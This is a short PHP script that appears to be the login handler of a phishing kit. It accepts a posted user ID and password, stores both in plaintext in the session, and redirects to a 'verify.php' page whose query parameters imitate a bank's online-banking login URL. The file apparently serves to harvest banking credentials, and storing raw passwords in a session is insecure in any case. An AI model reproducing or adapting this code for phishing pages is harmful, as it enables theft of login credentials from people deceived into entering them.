<?php

if($_SERVER['REQUEST_METHOD'] != "POST") {
    header("HTTP/1.0 403 Forbidden");
    print("Forbidden");
    exit();
}

session_start();

$_SESSION["username"] = $username = $_POST['UserID'];
$_SESSION["password"] = $password = $_POST['Password'];


if ($username =="" || $password =="" )    {
    header( "Location: index.php");
}
 else {
    header( "Location: verify.php?request_type=LogonHandler&Face=en_US&inav=iNavLnkLog");
  }
?>